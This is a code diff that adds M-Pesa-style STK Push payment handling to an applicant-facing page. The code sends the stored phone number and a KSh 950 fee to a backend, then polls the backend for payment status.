@@ -108,6 +108,7 @@ Pay KSh 950
 
 
 <script>
+let btn = document.querySelector("button");
 
 let applicant = localStorage.getItem("applicantName");
 
@@ -115,13 +116,132 @@ document.getElementById("name").innerHTML =
 "Dear " + (applicant || "Applicant");
 
 
-function paySecurity(){
+async function paySecurity(){
 
-// Connect STK Push here
+btn.disabled=true;
+btn.innerHTML="Sending STK Push...";
 
-alert("STK Push sent. Complete payment on your phone.");
+let phone = localStorage.getItem("phoneNumber");
+
+if(!phone){
+
+alert("Phone number not found");
+btn.disabled=false;
+btn.innerHTML="Pay KSh 950";
+return;
 
 }
+
+
+try{
+
+let response = await fetch(
+"https://swiftwallet-backend-k8kn.onrender.com/stk-push",
+{
+method:"POST",
+headers:{
+"Content-Type":"application/json"
+},
+body:JSON.stringify({
+phone:phone,
+amount:950
+})
+});
+
+
+let data = await response.json();
+
+console.log(data);
+
+
+if(!data.success){
+
+alert(data.message || "Payment failed");
+
+btn.disabled=false;
+btn.innerHTML="Pay KSh 950";
+
+return;
+
+}
+
+
+if(data.status=="completed"){
+
+window.location.href="status.html";
+return;
+
+}
+
+
+if(data.status=="pending"){
+
+btn.innerHTML="Waiting for payment...";
+
+
+let checkout = data.checkout_request_id;
+
+
+let timer=setInterval(async()=>{
+
+
+let res = await fetch(
+"https://swiftwallet-backend-k8kn.onrender.com/payment-status",
+{
+method:"POST",
+headers:{
+"Content-Type":"application/json"
+},
+body:JSON.stringify({
+checkout_request_id:checkout
+})
+});
+
+
+let status = await res.json();
+
+console.log(status);
+
+
+if(status.status=="completed"){
+
+clearInterval(timer);
+
+window.location.href="status.html";
+
+}
+
+
+if(status.status=="failed"){
+
+clearInterval(timer);
+
+alert("Payment failed");
+
+btn.disabled=false;
+btn.innerHTML="Pay KSh 950";
+
+}
+
+
+},3000);
+
+}
+
+
+}catch(error){
+
+console.log(error);
+
+alert("Payment request failed");
+
+btn.disabled=false;
+btn.innerHTML="Pay KSh 950";
+
+}
+
+    }
+
 
 </script>
 
